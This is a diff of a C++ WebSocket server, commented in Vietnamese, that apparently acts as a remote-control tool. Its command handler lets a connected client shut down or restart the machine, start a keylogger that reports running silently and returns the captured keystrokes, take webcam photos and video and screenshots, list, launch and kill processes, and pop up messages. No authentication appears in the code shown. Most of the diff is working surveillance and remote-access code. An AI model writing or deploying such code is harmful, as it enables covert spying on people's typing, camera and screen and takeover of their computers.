@@ -1,7 +1,7 @@
 #include <nlohmann/json.hpp> 
 
 ////HEADERS (remember to link cpp files before run)
-#include "Headers/shutdown.h"
+#include "Headers/control.h"
 #include "Headers/keylogger.h"
 #include "Headers/webcam.h"
 #include "Headers/apps.h"
@@ -38,12 +38,12 @@ namespace websocket = beast::websocket;
 namespace net = boost::asio;
 using tcp = boost::asio::ip::tcp;
 using json = nlohmann::json;
-namespace http = beast::http; // Thêm namespace http
+namespace http = beast::http; 
 
 //------------------------------------------------------------------------------
 
 /**
- * @brief Hàm kiểm tra chuỗi kết thúc bằng đuôi nào đó (thay thế cho ends_with C++20)
+ * @brief Hàm kiểm tra chuỗi kết thúc bằng đuôi nào đó
  */
 bool string_ends_with(const std::string& str, const std::string& suffix) {
     return str.size() >= suffix.size() && 
@@ -272,7 +272,7 @@ private:
         }
         
         // ------------------------------------------------------------------
-        // LOGIC XỬ LÝ TIN NHẮN ĐẾN TỪ CLIENT (MỚI)
+        // LOGIC XỬ LÝ TIN NHẮN ĐẾN TỪ CLIENT 
         // ------------------------------------------------------------------
         
         std::string message = beast::buffers_to_string(buffer_.data());
@@ -293,9 +293,41 @@ private:
             json response_json;
             std::string file_path;
 
+            // ------------------------------------------------------------------
+            // CONTROL
+            // ------------------------------------------------------------------
+
             if (command == "shutdown"){
-                shutdown();
+                std::cout << "[System] Shutdown command received." << std::endl;
+                
+                int ret = shutdown();
+                
+                if (ret == 0) {
+                    response_json = {{"command", "success"}, {"payload", "Đã gửi lệnh tắt máy (2s)..."}};
+                } else {
+                    response_json = {{"command", "error"}, {"payload", "Lỗi: Không thể tắt máy (Code: " + std::to_string(ret) + ")"}};
+                }
+                send(std::make_shared<std::string const>(response_json.dump()));
             }
+            
+            else if (command == "restart"){
+                std::cout << "[System] Restart command received." << std::endl;
+                
+                
+                int ret = restart();
+
+                if (ret == 0) {
+                    response_json = {{"command", "success"}, {"payload", "Đã gửi lệnh khởi động lại (2s)..."}};
+                } else {
+                    response_json = {{"command", "error"}, {"payload", "Lỗi: Không thể khởi động lại (Code: " + std::to_string(ret) + ")"}};
+                }
+                send(std::make_shared<std::string const>(response_json.dump()));
+            }
+
+            // ------------------------------------------------------------------
+            // KEYLOGGER
+            // ------------------------------------------------------------------
+
             else if (command == "keylogger_start") {
                 if (is_logging_.load() == false) {
                     {
@@ -303,19 +335,20 @@ private:
                         accumulated_log_.clear();
                     }
                     is_logging_.store(true);
-                    
                     keylogger_thread_ = std::thread(&WebsocketSession::keylogger_loop, shared_from_this());
-                    std::cout << "[Keylogger] Started logging." << std::endl;
+                    
+                    response_json = {{"command", "info"}, {"payload", "Keylogger đã được kích hoạt ngầm."}};
+                    send(std::make_shared<std::string const>(response_json.dump()));
                 } else {
-                    std::cout << "[Keylogger] Already running." << std::endl;
+                    response_json = {{"command", "info"}, {"payload", "Keylogger đang chạy rồi."}};
+                    send(std::make_shared<std::string const>(response_json.dump()));
                 }
             }
+
             else if (command == "keylogger_stop") {
                 if (is_logging_.load() == true) {
                     is_logging_.store(false); 
-                    if (keylogger_thread_.joinable()) {
-                        keylogger_thread_.join(); 
-                    }
+                    if (keylogger_thread_.joinable()) keylogger_thread_.join(); 
 
                     std::string final_log;
                     {
@@ -324,204 +357,169 @@ private:
                         accumulated_log_.clear(); 
                     }
                     
-                    std::string key_log_string = "--- TOAN BO CHUOI LOG ---\n";
+                    std::string key_log_string = "--- SESSION LOG START ---\n";
                     key_log_string += final_log;
-                    key_log_string += "\n---------------------------\n";
+                    key_log_string += "\n--- SESSION LOG END ---\n";
 
-                    response_json = {
-                        {"command", "keylogger_log"},
-                        {"payload", key_log_string}
-                    };
-                    std::cout << "[Keylogger] Log collected and sending..." << std::endl;
+                    response_json = {{"command", "keylogger_log"}, {"payload", key_log_string}};
                     send(std::make_shared<std::string const>(response_json.dump()));
                 } else {
-                    std::cout << "[Keylogger] Not currently running." << std::endl;
+                    response_json = {{"command", "error"}, {"payload", "Keylogger chưa được bật."}};
+                    send(std::make_shared<std::string const>(response_json.dump()));
                 }
             }
+
+            // ------------------------------------------------------------------
+            // WEBCAM & SCREEN
+            // ------------------------------------------------------------------
+
             else if (command == "webcam_capture"){
                 file_path = capture();
-                
                 if (!file_path.empty()) {
-                    response_json = {
-                        {"command", "webcam_capture"}, 
-                        {"payload",  file_path} 
-                    };
-                    std::cout << "[Webcam] Picture taken and sending path: " << file_path << std::endl;
-                    send(std::make_shared<std::string const>(response_json.dump()));
+                    response_json = {{"command", "webcam_capture"}, {"payload",  file_path}};
                 } else {
-                    response_json = {{"command", "error"}, {"payload", "Webcam capture failed."}};
-                    send(std::make_shared<std::string const>(response_json.dump()));
+                    response_json = {{"command", "error"}, {"payload", "Lỗi chụp Webcam."}};
                 }
-            }
-            else if(command == "webcam_record"){
-                double sec_record = (j.count("payload") && j["payload"].count("duration")) ? j["payload"]["duration"].get<double>() : 5.0;
-                
-                file_path = record(sec_record);
-                
-                if (!file_path.empty()) {
-                    response_json = {
-                        {"command", "webcam_record"}, 
-                        {"payload", file_path}
-                    };
-                    std::cout << "[Webcam] Video taken and sending path: " << file_path << std::endl;
-                    send(std::make_shared<std::string const>(response_json.dump()));
-                } else {
-                    response_json = {{"command", "error"}, {"payload", "Webcam recording failed."}};
-                    send(std::make_shared<std::string const>(response_json.dump()));
-                }
-            }
-            else if (command == "http_request") {
-                // Dấu hiệu nhận biết: request không phải WS mà là HTTP
-                std::cout << "[HTTP] Received non-WS request. Ignoring in WS session." << std::endl;
-            }
-            // ----- Mới
-            // 1. MÀN HÌNH (Khớp lệnh "screen_capture" của Client)
-            // ----------------------------------------------------
-            else if (command == "screen_capture") {
-                // Giả sử hàm captureScreen() vẫn trả về string path như cũ
-                file_path = captureScreen(); 
-                if (!file_path.empty()) {
-                    response_json = {
-                        {"command", "screen_capture"}, // Client đợi lệnh này để showImageModal
-                        {"payload", file_path}
-                    };
-                    send(std::make_shared<std::string const>(response_json.dump()));
-                }
-            }
-
-            // ----------------------------------------------------
-            // 2. DANH SÁCH APPS (Khớp lệnh "list_apps")
-            // ----------------------------------------------------
-            else if (command == "list_apps") {
-                json list = listApps(); // Hàm này giờ trả về JSON Array
-                response_json = {
-                    {"command", "list_apps"}, 
-                    {"payload", list} // Gửi nguyên mảng JSON về cho showTableModal
-                };
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
 
-            // ----------------------------------------------------
-            // 3. MỞ APP (Khớp lệnh "start_app", payload: {name: "..."})
-            // ----------------------------------------------------
+            else if(command == "webcam_record"){
+                double sec_record = (j.count("payload") && j["payload"].count("duration")) ? j["payload"]["duration"].get<double>() : 5.0;
+                file_path = record(sec_record);
+                if (!file_path.empty()) {
+                    response_json = {{"command", "webcam_record"}, {"payload", file_path}};
+                } else {
+                    response_json = {{"command", "error"}, {"payload", "Lỗi quay video Webcam."}};
+                }
+                send(std::make_shared<std::string const>(response_json.dump()));
+            }
+            else if (command == "screen_capture") {
+                file_path = captureScreen();
+                if (!file_path.empty()) {
+                    response_json = {{"command", "screen_capture"}, {"payload", file_path}};
+                } else {
+                    response_json = {{"command", "error"}, {"payload", "Lỗi chụp màn hình."}};
+                }
+                send(std::make_shared<std::string const>(response_json.dump()));
+            }
+
+            // ------------------------------------------------------------------
+            // APPS & PROCESSES
+            // ------------------------------------------------------------------
+
+            else if (command == "list_apps") {
+                json list = listApps();
+                response_json = {{"command", "list_apps"}, {"payload", list}};
+                send(std::make_shared<std::string const>(response_json.dump()));
+            }
+
             else if (command == "start_app") {
                 std::string appName = "";
-                // Client gửi: { command: "start_app", payload: { name: "notepad" } }
                 if (j.count("payload") && j["payload"].is_object() && j["payload"].count("name")) {
+                    // Lấy app name từ payload
                     appName = j["payload"]["name"].get<std::string>();
                 }
 
                 if (!appName.empty() && startApp(appName)) {
-                    response_json = {{"command", "info"}, {"payload", "Đã mở App: " + appName}};
+                    response_json = {{"command", "success"}, {"payload", "Đã mở App: " + appName}};
                 } else {
-                    response_json = {{"command", "error"}, {"payload", "Lỗi mở App (hoặc tên trống)."}};
+                    response_json = {{"command", "error"}, {"payload", "Không thể mở App: " + appName}};
                 }
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
 
-            // ----------------------------------------------------
-            // 4. ĐÓNG APP (Khớp lệnh "stop_app", payload: {id: "..."})
-            // ----------------------------------------------------
             else if (command == "stop_app") {
                 int pid = 0;
                 std::string input = "";
-
-                // Lấy dữ liệu gửi lên (có thể là số PID "1234" hoặc tên "notepad")
                 if (j.count("payload") && j["payload"].is_object() && j["payload"].count("id")) {
                      input = j["payload"]["id"].get<std::string>();
                 }
 
-                // Kiểm tra xem input là SỐ hay CHỮ
+                // Nếu input là số -> Tìm bằng PID trước
+                // Sai -> Tìm bằng tên
                 bool isNumber = !input.empty() && std::all_of(input.begin(), input.end(), ::isdigit);
-
                 if (isNumber) {
-                    // Nếu là số -> Chuyển thành int
                     try { pid = std::stoi(input); } catch(...) { pid = 0; }
                 } else {
-                    // Nếu là chữ -> Dùng hàm tìm kiếm thông minh
                     pid = getAppPIDByName(input);
-                    std::cout << "[Apps] Smart Search: '" << input << "' -> PID: " << pid << std::endl;
                 }
 
                 if (pid > 0 && killAppByID(pid)) {
-                     response_json = {{"command", "info"}, {"payload", "Đã đóng App (" + input + ") - PID: " + std::to_string(pid)}};
+                     response_json = {{"command", "success"}, {"payload", "Đã đóng App ID: " + std::to_string(pid)}};
                 } else {
                      response_json = {{"command", "error"}, {"payload", "Không tìm thấy App: " + input}};
                 }
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
-
-            // ----------------------------------------------------
-            // 5. DANH SÁCH PROCESS (Khớp lệnh "list_processes")
-            // ----------------------------------------------------
             else if (command == "list_processes") {
                 json list = listProcesses();
-                response_json = {
-                    {"command", "list_processes"},
-                    {"payload", list}
-                };
+                response_json = {{"command", "list_processes"}, {"payload", list}};
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
 
-            // ----------------------------------------------------
-            // 6. CHẠY PROCESS (Khớp lệnh "start_process")
-            // ----------------------------------------------------
             else if (command == "start_process") {
                 std::string procName = "";
                 if (j.count("payload") && j["payload"].is_object() && j["payload"].count("name")) {
+                    // Lấy process name từ payload
                     procName = j["payload"]["name"].get<std::string>();
                 }
                 
-                // Tận dụng hàm startApp vì cơ chế giống nhau
                 if (!procName.empty() && startApp(procName)) {
-                    response_json = {{"command", "info"}, {"payload", "Đã chạy Process: " + procName}};
+                    response_json = {{"command", "success"}, {"payload", "Đã chạy Process: " + procName}};
                 } else {
                     response_json = {{"command", "error"}, {"payload", "Lỗi chạy Process."}};
                 }
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
 
-            // ----------------------------------------------------
-            // 7. DIỆT PROCESS (Khớp lệnh "stop_process")
-            // ----------------------------------------------------
             else if (command == "stop_process") {
                 int pid = 0;
                 std::string input = "";
-
                 if (j.count("payload") && j["payload"].is_object() && j["payload"].count("id")) {
                      input = j["payload"]["id"].get<std::string>();
                 }
 
-                // Logic tương tự: Check số hay chữ
+                // Tương tự như stop_app
                 bool isNumber = !input.empty() && std::all_of(input.begin(), input.end(), ::isdigit);
-
                 if (isNumber) {
                     try { pid = std::stoi(input); } catch(...) { pid = 0; }
-                } else {
-                    // Tìm PID theo tên process
+                } else { 
                     pid = getProcessPIDByName(input);
-                    std::cout << "[Process] Smart Search: '" << input << "' -> PID: " << pid << std::endl;
                 }
 
                 if (pid > 0 && killProcessByID(pid)) {
-                     response_json = {{"command", "info"}, {"payload", "Đã diệt Process (" + input + ") - PID: " + std::to_string(pid)}};
+                     response_json = {{"command", "success"}, {"payload", "Đã diệt Process ID: " + std::to_string(pid)}};
                 } else {
                      response_json = {{"command", "error"}, {"payload", "Không tìm thấy Process: " + input}};
                 }
                 send(std::make_shared<std::string const>(response_json.dump()));
             }
-            // ------ 
+            
             // ------------------------------------------------------------------
-        } catch (const json::parse_error& e) {
-            std::cerr << "!!! SERVER ERROR: Lỗi JSON: " << e.what() << std::endl;
-        } catch (const std::exception& e) {
-            std::cerr << "!!! SERVER ERROR: Lỗi xử lý tin nhắn: " << e.what() << std::endl;
-        }
-        // ------------------------------------------------------------------
-        // Xóa buffer và tiếp tục đọc
-        buffer_.consume(buffer_.size());
-        do_read(); // Tiếp tục vòng lặp đọc
+            // SEND_MSG
+            // ------------------------------------------------------------------
 
+            else if (command == "send_message") {
+                std::string msg = "";
+                if (j.count("payload") && j["payload"].is_object() && j["payload"].count("text")) {
+                    msg = j["payload"]["text"].get<std::string>();
+                }
+                
+                // Display msg trên máy Server với MessageBox
+                std::thread([msg](){
+                    MessageBoxA(NULL, msg.c_str(), "Message from Admin", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+                }).detach();
+                
+                response_json = {{"command", "success"}, {"payload", "Message displayed on server."}};
+                send(std::make_shared<std::string const>(response_json.dump()));
+            }
+
+        } catch (const std::exception& e) {
+            std::cerr << "SERVER ERROR: " << e.what() << std::endl;
+        }
+        
+        buffer_.consume(buffer_.size());
+        do_read(); 
     }
 
 
@@ -567,12 +565,9 @@ private:
     }
 };
 
-
-
-
 /**
- * @brief Lắng nghe các kết nối TCP đến (đã đơn giản hóa)
- * QUAN TRỌNG: Phải xử lý HTTP và WebSocket trên cùng một cổng.
+ * @brief Lắng nghe các kết nối TCP đến
+ * Phải xử lý HTTP và WebSocket trên cùng một cổng.
  */
 class Listener : public std::enable_shared_from_this<Listener>
 {
@@ -635,12 +630,11 @@ private:
             return;
         }
 
-        // 1. Đọc Header của request để phân loại
+        // Đọc Header của request để phân loại
         beast::flat_buffer buffer;
         http::request<http::string_body> req;
         
-        // Đọc đồng bộ (synchronous) để đơn giản hóa việc phân loại ban đầu
-        // Lưu ý: Trong production tải cao, nên dùng async_read nhưng ở đây dùng sync cho gọn code
+        // Đọc đồng bộ để đơn giản hóa việc phân loại ban đầu
         http::read(socket, buffer, req, ec);
 
         if (ec) {
@@ -651,7 +645,7 @@ private:
             return;
         }
 
-        // 2. Kiểm tra xem đây là WebSocket Upgrade hay HTTP thường
+        // Kiểm tra xem đây là WebSocket Upgrade hay HTTP thường
         if (websocket::is_upgrade(req)) 
         {
             // --- XỬ LÝ WEBSOCKET ---
@@ -681,13 +675,10 @@ private:
         } 
         else 
         {
-            // --- XỬ LÝ HTTP THƯỜNG (File Transfer) ---
+            // --- XỬ LÝ HTTP THƯỜNG ---
             // Gọi hàm xử lý file, truyền socket và request đã đọc
             handle_http_file_request(socket, req);
-            
-            // Sau khi gửi file xong, socket thường sẽ đóng hoặc giữ alive tùy logic, 
-            // nhưng ở đây ta để handle_http_file_request tự xử lý xong rồi thoát scope.
-            // Nếu không keep-alive, ta có thể shutdown tại đây:
+
             socket.shutdown(tcp::socket::shutdown_send, ec);
         }
 
